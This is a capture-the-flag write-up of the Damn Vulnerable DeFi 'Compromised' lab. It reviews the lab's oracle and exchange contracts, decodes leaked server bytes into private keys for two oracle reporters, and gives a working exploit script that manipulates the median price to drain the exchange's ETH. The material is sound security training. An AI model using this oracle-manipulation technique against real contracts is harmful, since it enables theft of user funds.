## 1) Challenge

> <cite>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet: </cite>
>
>    HTTP/2 200 OK
>    content-type: text/html
>    content-language: en
>    vary: Accept-Encoding
>    server: cloudflare
>
>    4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
>
>    4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
>        
> <cite>A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each. This price is fetched from an on-chain oracle, and is based on three trusted reporters: </cite>
>
>    0xA73209FB1a42495120166736362A1DfA9F95A105
>    0xe92401A4d3af5E446d93D11EEc806b1462b39D15 
>    0x81A5D6E50C214044bE44cA0CB057fe119097850c
>
> <cite>Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange. </cite>([link](https://www.damnvulnerabledefi.xyz/challenges/7.html))

Challenge created by [@tinchoabbate](https://twitter.com/tinchoabbate).


## 2) Code Review

In this challenge there are 3 smart contracts: `TrustfulOracleInitializer.sol`, `Exchange.sol` and `TrustfulOracle.sol`.

### 2.1) `TrustfulOracleInitializer.sol`

This contract ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/compromised/TrustfulOracleInitializer.sol)) is responsible for creating the oracle contract with different sources (line `22`) and set the initial price (line `23`). In our case, the initial price for an NFT is `999 ETH` ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/compromised/compromised.challenge.js#L50)).

```solidity

contract TrustfulOracleInitializer {

    event NewTrustfulOracle(address oracleAddress);

    TrustfulOracle public oracle;

    constructor(
        address[] memory sources,
        string[] memory symbols,
        uint256[] memory initialPrices
    )
    {
        oracle = new TrustfulOracle(sources, true);
        oracle.setupInitialPrices(sources, symbols, initialPrices);
        emit NewTrustfulOracle(address(oracle));
    }
}

```

### 2.2) `Exchange.sol`

This contract ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/compromised/Exchange.sol)) allows users to buy and sell `DVNFT` NFT tokens at the initial price of `99 EHT` each. 

```solidity

contract Exchange is ReentrancyGuard {

    using Address for address payable;

    DamnValuableNFT public immutable token;
    TrustfulOracle public immutable oracle;

    event TokenBought(address indexed buyer, uint256 tokenId, uint256 price);
    event TokenSold(address indexed seller, uint256 tokenId, uint256 price);

    constructor(address oracleAddress) payable {
        token = new DamnValuableNFT();
        oracle = TrustfulOracle(oracleAddress);
    }

    function buyOne() external payable nonReentrant returns (uint256) {
        uint256 amountPaidInWei = msg.value;
        require(amountPaidInWei > 0, "Amount paid must be greater than zero");

        // Price should be in [wei / NFT]
        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
        require(amountPaidInWei >= currentPriceInWei, "Amount paid is not enough");

        uint256 tokenId = token.safeMint(msg.sender);
        
        payable(msg.sender).sendValue(amountPaidInWei - currentPriceInWei);

        emit TokenBought(msg.sender, tokenId, currentPriceInWei);

        return tokenId;
    }

    function sellOne(uint256 tokenId) external nonReentrant {
        require(msg.sender == token.ownerOf(tokenId), "Seller must be the owner");
        require(token.getApproved(tokenId) == address(this), "Seller must have approved transfer");

        // Price should be in [wei / NFT]
        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
        require(address(this).balance >= currentPriceInWei, "Not enough ETH in balance");

        token.transferFrom(msg.sender, address(this), tokenId);
        token.burn(tokenId);
        
        payable(msg.sender).sendValue(currentPriceInWei);

        emit TokenSold(msg.sender, tokenId, currentPriceInWei);
    }

    receive() external payable {}
}

```


It implements `2` main functions:
- `buyOne`:
    - checks that the amount to buy an NFT is `> 0` (line `31`)
    - computes the buy price of the NFT by calling the `getMedianPrice` function from the Oracle contract (line `34`)
    - checks if the amount is `>` than the NFT price (line `35`)
    - mints a new NFT token and sends it to `msg.sender` (line `37`)
    - finally, it returns the NFT id (line `43`)
- `sellOne`:
    - checks if the `msg.sender` is the owner of the NFT (line `47`)
    - checks if the `msg.sender` approved the selling of the NFT (line `48`)
    - computes the selling price of the NFT by calling the `getMedianPrice` function from the Oracle contract (line `51`)
    - checks if the contract has enough balance to pay the NFT price (line `52`)
    - transfers the NFT from the `msg.sender` to the contract address (line `54`)
    - pays the NFT price to the `msg.sender` (line `57`)

The buy and sell prices are retrieved from the oracle function `getMedianPrice`. It means that if we can buy an NFT token at a low price and then somehow change the price to be equal to the contract balance when we sell it, we'll be able to steal all the contract balance (line `57` will send us all the contract balance).

### 2.3) `TrustfulOracle.sol`

This contract ([source code](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/compromised/TrustfulOracle.sol)) is responsible for providing the NFT price. 

```solidity

contract TrustfulOracle is AccessControlEnumerable {

    bytes32 public constant TRUSTED_SOURCE_ROLE = keccak256("TRUSTED_SOURCE_ROLE");
    bytes32 public constant INITIALIZER_ROLE = keccak256("INITIALIZER_ROLE");

    // Source address => (symbol => price)
    mapping(address => mapping (string => uint256)) private pricesBySource;

    modifier onlyTrustedSource() {
        require(hasRole(TRUSTED_SOURCE_ROLE, msg.sender));
        _;
    }

    modifier onlyInitializer() {
        require(hasRole(INITIALIZER_ROLE, msg.sender));
        _;
    }

    event UpdatedPrice(
        address indexed source,
        string indexed symbol,
        uint256 oldPrice,
        uint256 newPrice
    );

    constructor(address[] memory sources, bool enableInitialization) {
        require(sources.length > 0);
        for(uint256 i = 0; i < sources.length; i++) {
            _setupRole(TRUSTED_SOURCE_ROLE, sources[i]);
        }

        if (enableInitialization) {
            _setupRole(INITIALIZER_ROLE, msg.sender);
        }
    }

    // A handy utility allowing the deployer to setup initial prices (only once)
    function setupInitialPrices(
        address[] memory sources,
        string[] memory symbols,
        uint256[] memory prices
    ) 
        public
        onlyInitializer
    {
        // Only allow one (symbol, price) per source
        require(sources.length == symbols.length && symbols.length == prices.length);
        for(uint256 i = 0; i < sources.length; i++) {
            _setPrice(sources[i], symbols[i], prices[i]);
        }
        renounceRole(INITIALIZER_ROLE, msg.sender);
    }

    function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource {
        _setPrice(msg.sender, symbol, newPrice);
    }

    function getMedianPrice(string calldata symbol) external view returns (uint256) {
        return _computeMedianPrice(symbol);
    }

    function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory) {
        uint256 numberOfSources = getNumberOfSources();
        uint256[] memory prices = new uint256[](numberOfSources);

        for (uint256 i = 0; i < numberOfSources; i++) {
            address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);
            prices[i] = getPriceBySource(symbol, source);
        }

        return prices;
    }

    function getPriceBySource(string memory symbol, address source) public view returns (uint256) {
        return pricesBySource[source][symbol];
    }

    function getNumberOfSources() public view returns (uint256) {
        return getRoleMemberCount(TRUSTED_SOURCE_ROLE);
    }

    function _setPrice(address source, string memory symbol, uint256 newPrice) private {
        uint256 oldPrice = pricesBySource[source][symbol];
        pricesBySource[source][symbol] = newPrice;
        emit UpdatedPrice(source, symbol, oldPrice, newPrice);
    }

    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
        uint256[] memory prices = _sort(getAllPricesForSymbol(symbol));

        // calculate median price
        if (prices.length % 2 == 0) {
            uint256 leftPrice = prices[(prices.length / 2) - 1];
            uint256 rightPrice = prices[prices.length / 2];
            return (leftPrice + rightPrice) / 2;
        } else {
            return prices[prices.length / 2];
        }
    }

    function _sort(uint256[] memory arrayOfNumbers) private pure returns (uint256[] memory) {
        for (uint256 i = 0; i < arrayOfNumbers.length; i++) {
            for (uint256 j = i + 1; j < arrayOfNumbers.length; j++) {
                if (arrayOfNumbers[i] > arrayOfNumbers[j]) {
                    uint256 tmp = arrayOfNumbers[i];
                    arrayOfNumbers[i] = arrayOfNumbers[j];
                    arrayOfNumbers[j] = tmp;
                }
            }
        }        
        return arrayOfNumbers;
    }
}

```


When created, it sets the sources with different roles: `TRUSTED_SOURCE_ROLE` and `INITIALIZER_ROLE` (lines `41` and `45`). The `TRUSTED_SOURCE_ROLE` is checked with `onlyTrustedSource` modifier (line `21`), and it allows setting the price by calling the `postPrice` function (line `66`).
These are the addresses that have this role ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/compromised/compromised.challenge.js#L6-L10)):
- `0xA73209FB1a42495120166736362A1DfA9F95A105`
- `0xe92401A4d3af5E446d93D11EEc806b1462b39D15`
- `0x81A5D6E50C214044bE44cA0CB057fe119097850c`

This contract has multiple functions:
- `setupInitialPrices` function allows addresses with role `TRUSTED_SOURCE_ROLE` to set the initial price (line `61`). This function is called by `TrustfulOracleInitializer` contract (line `23`) with initial price of `999 ETH` ([setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/compromised/compromised.challenge.js#L50))
- `postPrice` function allows addresses with the role `TRUSTED_SOURCE_ROLE` to set the price of a token. This function calls the `_setPrice` (line `67`). The price set by each trusted source is stored in the `pricesBySource` variable (line `96`)
- `getMedianPrice` is the external function used to retrieve the median price of an NFT token. It calls the private function`_computeMedianPrice` (line `71`)
- `_computeMedianPrice` is the function responsible for computing the median price. It first calls `getAllPricesForSymbol` (line `101`) to get all the prices for that specific token symbol (lines `75-83`) and then sort the sort these prices by calling the `_sort` function (line `101`). Once all the prices are reetrived, it computes the median price to return (lines `104-109`).

If we want to change the NFT price, we need to set at least the price of `2` different NFT tokens.

### 2.4) Server Data

So far, we know that:
- to change the price of an NFT, we need to have the `TRUSTED_SOURCE_ROLE` role
- there are `3` addresses that have this role
- if we can lower the price of an NFT and buy at least one and later change the price of the NFT to be equal to the exchange balance and then sell that NFT token, we will be able to steal all the exchange balance


Since the only way to alter the NFT price is with one of the `3` addresses. Let's investigate the data provided in this challenge to see if it's related to one or more of these addresses. For example, to send a transaction on behalf of one or more of these addresses, we should know their private keys.

I could not easily understand what the data was about initially, and neither found some patterns. The only common thing I noticed is that both data arrays start with `4d48`, but other than that, I had no clue about what this data was or how you can derive something that looks like a private key.

I first tried to decode this data using a brute-force approach by trying different encodings and seeing if the data returned had any sense.

I tried with the first array of bytes:
```javascript

let data = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35".replaceAll(" ", "")

let encodings = ['hex', 'ascii', 'base64', 'binary']

for (const enc1 of encodings) {
    let d1 = Buffer.from(data, enc1).toString("utf-8")
    console.log(`\n${enc1}:\n${d1}`)
}

```


Observing the output, none of the data makes much sense, so I tried to encode it again:
```javascript

for (const enc1 of encodings) {
    let d1 = Buffer.from(data, enc1).toString("utf-8")
    console.log(`\n${enc1}:\n${d1}`)

    for (const enc2 of encodings) {
        if (enc1 != enc2) {
            let d2 = Buffer.from(d1, enc2).toString("utf-8")
            console.log(`+ ${enc2}:\n${d2}`)
        }
    }
}

```


Looking at the output, I noticed something that looked like a private key. It resulted from the following encodings: `hex` and then `base64`.

Now we need to check if these are private keys or not and if they belong to one or more of the `3` trusted oracles addresses.
To do this check, I imported these potential private keys into a wallet, got the addresses, and checked if these addresses corresponded to those of the trusted oracles.

It turns out that the two byte arrays are the private keys of the following trusted oracles:
- `0xe92401A4d3af5E446d93D11EEc806b1462b39D15`
- `0x81A5D6E50C214044bE44cA0CB057fe119097850c`
 
At this point, we can send transactions using these two addresses and thus alter the NFT price.

## 3) Solution

The solution consists of the following steps:
- lower the price of the `DVNFT` to `0` using `2` of the `3` compromised oracle sources
- buy a `DVNFT` with our attacker address (we need to send a value that is `>` than `0`)
- set the price of the `DVNFT` to be equal to the exchange balance  using `2` of the `3` compromised oracle sources
- approve the exchange to transfer our NFT token
- sell the token: this way, since the price of the NFT token will be equal to the exchange balance, we'll receive all of its balance
- set the initial NFT token price

`compromised.challenge.js`:

```javascript

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */

        const eth = ethers.utils.parseEther('0.01');
        let provider = attacker.provider

        let data = [
            "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35",
            "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
        ];

        const signers = data
            .map(d => d.replaceAll(" ", ""))
            .map(d => Buffer.from(d, "hex").toString("utf-8"))
            .map(d => Buffer.from(d, "base64").toString("utf-8"))
            .map(d => new ethers.Wallet(d, provider))
            .filter(signer => sources.includes(signer.address))


        // lower the price
        for (const signer of signers) {
            await this.oracle.connect(signer).postPrice("DVNFT", 0);
        }

        // buy one
        await this.exchange.connect(attacker).buyOne({ value: eth });

        // set the price equal to the exchange balance
        for (const signer of signers) {
            await this.oracle.connect(signer).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        }

        // sell one
        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
        await this.exchange.connect(attacker).sellOne(0);

        // set the initial price
        for (const signer of signers) {
            await this.oracle.connect(signer).postPrice("DVNFT", INITIAL_NFT_PRICE);
        }
        
    });
    
```

You can find the complete code [here](https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/compromised/compromised.challenge.js).
